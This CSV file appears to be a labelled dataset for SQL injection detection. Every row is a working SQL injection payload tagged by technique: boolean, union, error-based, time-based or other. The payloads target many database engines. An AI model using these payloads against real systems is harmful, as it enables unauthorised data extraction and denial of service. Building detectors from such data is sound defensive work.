label,payload,family
attack,"1   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  3504  =  3504",boolean
attack,"1'||  (  select 'dujx' where 6896  =  6896 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"1'  )   as asjj where 1721  =  1721 union all select null,null,null,null,null,null--",union
attack,"-4286%""   )    )     )   union all select 2229,2229,2229,2229,2229,2229#",union
attack,"1,  (  select   (  case when   (  8674  =  7896  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",error
attack,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'gbhd'  =  'gbhd",time
attack,"1""  )   where 5850  =  5850 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",error
attack,-1602' or 3038  =  3038,boolean
attack,"-1148""   )    )    union all select 5442,5442,5442,5442#",union
attack,-8828%'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  '%'  =  ',error
attack,"1"" where 2403  =  2403 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,1'+  (  select xzvf where 9727  =  9727,other
attack,1' or sleep  (  5  )   and 'rpqn' like 'rpqn,time
attack,1'||  (  select 'bzxa' where 6320  =  6320,other
attack,"1  )   as cjmt where 4839  =  4839 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",error
attack,1%' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"-8608"" or 5460  =  4461--",boolean
attack,"1   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   9914  =  9914",boolean
attack,"-5078 union all select 9708,9708--",union
attack,1' where 1770  =  1770,other
attack,1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  '%'  =  ',time
attack,"1'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,end and    (    (   'zlsq'  =  'zlsq,boolean
attack,"-5064  )   as mzxc where 1889  =  1889 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",boolean
attack,1'  )   where 2330  =  2330 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,time
attack,"1""  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",boolean
attack,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",error
attack,"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""vzud"" like ""vzud",boolean
attack,"-7350'   )    )     )   union all select 9207,9207,9207,9207--",union
attack,"-2054%""   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,boolean
attack,"-1908""  )   where 6420  =  6420 union all select 6420,6420,6420,6420--",union
attack,"-7737'||  (  select 'xalo' where 9219  =  9219 union all select 9219,9219,9219,9219#",union
attack,"-1302""   )    )    as rshr where 2800  =  2800 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",boolean
attack,1 where 1519  =  1519,other
attack,"1""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""smnw"" like ""smnw",error
attack,"1""  )   where 2837  =  2837 and   (  3020  =  3020  )  *6703--",boolean
attack,"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'tqpj'  =  'tqpj",boolean
attack,"-9751""   )    )     )   or 5929  =  3884--",boolean
attack,"1'+  (  select 'bsva' where 4378  =  4378 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",boolean
attack,"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",union
attack,"-6453""   )    )    as hehs where 9363  =  9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",union
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'fpaf'  =  'fpaf",boolean
attack,"1%""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,1'+  (  select hvsb where 3666  =  3666,other
attack,"1 where 6119  =  6119 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"1"" union all select null,null,null,null,null--",union
attack,-4157'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'rdhm'  =  'rdhm,error
attack,"-7412""  )   as qngt where 2041  =  2041 union all select 2041--",union
attack,"1"" order by 1--",other
attack,"1,  (  select * from generate_series  (  9108,9108,case when   (  9108  =  2900  )   then 1 else 0 end  )   limit 1  )  ",other
attack,"-9829'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",error
attack,"1""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"1%""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,boolean
attack,1  )   as nwfz where 7365  =  7365 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,error
attack,"-6412   )    )    as cnfs where 6557  =  6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",union
attack,"-6381%""   )    )     )   union all select 1503,1503,1503,1503#",union
attack,-5286' or 6783  =  1233,boolean
attack,1'||  (  select 'xugb' from dual where 6772  =  6772,other
attack,"1""  )   where 1416  =  1416 union all select null,null,null#",union
attack,"1"" where 7015  =  7015",other
attack,"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""vziz""  =  ""vziz",boolean
attack,"1"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,"1""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bcxh"" like ""bcxh",boolean
attack,"-5573'  )   union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",union
attack,"-5652%'  )   union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",union
attack,"1""   )    )    as zgig where 5748  =  5748 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",error
attack,1'||  (  select 'zwcp' where 3333  =  3333,other
attack,"1%'   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"-1956""  )   where 1448  =  1448 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",error
attack,select case when 2095  =  9074 then 1 else null end--,other
attack,"-5911 union all select 2245,2245,2245,2245,2245,2245#",union
attack,1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  #,time
attack,"-4828'+  (  select qxnw where 9488  =  9488 union all select 9488,9488--",union
attack,"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",union
attack,"1""   )    )    as ubrg where 7318  =  7318 and 7331  =  6529--",boolean
attack,"1"" where 7828  =  7828",other
attack,1'||  (  select 'lljg' from dual where 7631  =  7631,other
attack,1  )   as iknl where 3885  =  3885 rlike sleep  (  5  )  #,time
attack,"1""  )   as lgxc where 1117  =  1117 union all select null,null,null,null,null,null,null,null#",union
attack,1%'  )   and sleep  (  5  )  #,time
attack,"1%'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   '%'  =  '",error
attack,1 where 2649  =  2649 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,time
attack,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'aiuy'  =  'aiuy",time
attack,-7442  )   or 3391  =  7492,boolean
attack,1'  )   where 9317  =  9317 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,time
attack,"-4739'   )    )    union all select 6585,6585,6585,6585,6585--",union
attack,"1""  )   as yphz where 8174  =  8174 union all select null,null,null,null,null,null,null--",union
attack,"1%'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1' where 6963  =  6963 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack," end and    (    (     (  ""memh"" like ""memh",boolean
attack,"1"" and 4595  =  4595#",boolean
attack,1  )   where 2083  =  2083,other
attack,"-6158""   )    )     )   or 8571  =  8571--",boolean
attack,"1'+  (  select 'ycvl' where 8415  =  8415 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"1'+  (  select qjng where 1897  =  1897 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",boolean
attack,"1   )    )    as rqbo where 2243  =  2243 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",error
attack,"1  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",boolean
attack,"1""   )    )    as tpeh where 6306  =  6306 and 5965  =  5806#",boolean
attack,"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",boolean
attack,"1'   )    )    as ijyi where 3694  =  3694   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
attack,"-3587'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'psqt' like 'psqt",error
attack,"1' in boolean mode  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  #",boolean
attack,"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'xikz' like 'xikz",boolean
attack,"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",error
attack,"1""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""nubc"" like ""nubc",boolean
attack,"1%'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  '%'  =  ',time
attack,"select * from generate_series  (  6200,6200,case when   (  6200  =  5449  )   then 1 else 0 end  )   limit 1--",other
attack,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'gbpg'  =  'gbpg",error
attack,select   (  case when   (  7169  =  7785  )   then 1 else 7169*  (  select 7169 from master..sysdatabases  )   end  )  --,other
attack,1'  )   and 7533  =  7533 and   (  'cryr'  =  'cryr,boolean
attack,"1  )   and elt  (  3138  =  1817,1817  )  ",boolean
attack,-2214'  )   union all select 8228#,union
attack,if  (  4194  =  4133  )   select 4194 else drop function tqhz--,other
attack,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'qtfl'  =  'qtfl",boolean
attack,"1'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,-4184'   )    )     )   or 2579  =  4654#,boolean
attack,"1%'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  '%'  =  '",error
attack,"1%'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"-3979' in boolean mode  )   union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",union
attack,waitfor delay '0:0:5' and 'fjpf' like 'fjpf,time
attack,"1'   )    )     )   and make_set  (  9514  =  8668,8668  )   and    (    (     (  'sgjj' like 'sgjj",boolean
attack,"-7006' where 6966  =  6966 union all select 6966,6966,6966,6966#",union
attack,select   (  case when   (  4393  =  2875  )   then 1 else 4393*  (  select 4393 from master..sysdatabases  )   end  )  --,other
attack,1'+  (  select byor where 4538  =  4538,other
attack,select   (  case when   (  8113  =  8981  )   then 8113 else 1/  (  select 0  )   end  )  --,other
attack,"1""  )   where 2016  =  2016 and   (  1547  =  2093  )  *2093--",boolean
attack,end# thjv,other
attack,-5258  )   or   (  8459  =  8459  )  *4906,boolean
attack,"-2876""  )   or make_set  (  5306  =  6127,6127  )   and   (  ""urjm""  =  ""urjm",boolean
attack,"-7258""  )   as wjjr where 2110  =  2110 union all select 2110,2110,2110,2110,2110,2110,2110,2110,2110--",union
attack,"1  )   as auly where 4146  =  4146 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1""  )   as ybkp where 7788  =  7788 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,"1   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  6312  =  6312",boolean
attack,1  )   as ywrn where 1893  =  1893,other
attack,"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",other
attack,1   )    )     )   and 7533  =  7533 and    (    (     (  7740  =  7740,boolean
attack,1  )   where 4548  =  4548 and 9198  =  9198--,boolean
attack,"1'+  (  select 'mtpt' where 7483  =  7483 union all select null,null,null,null,null,null,null,null,null--",union
attack,"-9152""   )    )    as avga where 3825  =  3825 order by 1#",other
attack,"1""  )   as pxdq where 2236  =  2236 and 2006  =  2006",boolean
attack,"-9015%""  )   union all select 6948,6948--",union
attack,"1  )   where 1270  =  1270 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",error
attack,"1""  )   where 8390  =  8390",other
attack,1'   )    )    and 4650  =  1322#,boolean
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",other
attack,"1   )    )    as xovu where 4530  =  4530 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"1' in boolean mode  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",boolean
attack,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'zjel' like 'zjel",time
attack,-3059'  )   as jhbh where 4056  =  4056 or   (  3498  =  6965  )  *6965--,boolean
attack,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'sqzl'  =  'sqzl",time
attack,"1"" where 1537  =  1537 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",error
attack,1  )   where 1100  =  1100 and sleep  (  5  )  --,time
attack,waitfor delay '0:0:5' and    (    (     (  'ywnm'  =  'ywnm,time
attack,"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""fvtu"" like ""fvtu",boolean
attack,-4637' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,error
attack,1 where 5311  =  5311 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'hryb'  =  'hryb",boolean
attack,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",error
attack,1' where 5035  =  5035 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"1%""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"-6475""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""mdsx"" like ""mdsx",error
attack,"1 where 2914  =  2914 union all select null,null,null#",union
attack,"1"" and 2006  =  2006",boolean
attack,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'vwve' like 'vwve,time
attack,"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",union
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"-9634'   )    )     )   union all select 4141,4141#",union
attack,"1""  )   as uuth where 8555  =  8555 union all select null,null#",union
attack,"-6194"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",boolean
attack,"-9861' union all select 5710,5710,5710,5710,5710--",union
attack,"1""   )    )    as swix where 2459  =  2459 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,1  )   as selm where 5759  =  5759,other
attack,"-6112""  )   union all select 8203,8203,8203,8203,8203,8203,8203--",union
attack,"1""  )   where 8462  =  8462 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",error
attack,1'  )   as cdrm where 4595  =  4595 order by 1#,other
attack,1 and 4595  =  4595#,boolean
attack,"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""alkz""  =  ""alkz",time
attack,"1  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",other
attack,1' where 4134  =  4134 and 1102  =  6300--,boolean
attack,"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'hllf'  =  'hllf",error
attack,"-3604'  )   as fyev where 7259  =  7259 union all select 7259,7259,7259,7259--",union
attack,"1%'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   '%'  =  '",boolean
attack,"elt  (  8192  =  8192,sleep  (  5   )    )   ",time
attack,"1""   )    )    as luon where 4676  =  4676 rlike sleep  (  5  )  #",time
attack,"1""  )   as dlfq where 8410  =  8410",other
attack,"1  )   as guru where 7615  =  7615 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"1'   )    )    union all select null,null,null--",union
attack,"1' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,-9340  )   where 5462  =  5462 or 3038  =  3038,boolean
attack,"1   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   8294  =  8294",error
attack,1'   )    )    as xirr where 2425  =  2425,other
attack,"1%""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""%""  =  """,boolean
attack,1%'   )    )    and 4595  =  4595#,boolean
attack,"1   )    )    as avdz where 1881  =  1881 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,select case when 7717  =  7717 then 1 else null end--,other
attack,"-1692'  )   union all select 7074,7074,7074,7074,7074,7074,7074#",union
attack,"1""  )   where 9248  =  9248",other
attack,"1""  )   where 9855  =  9855",other
attack,"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- xlfz",boolean
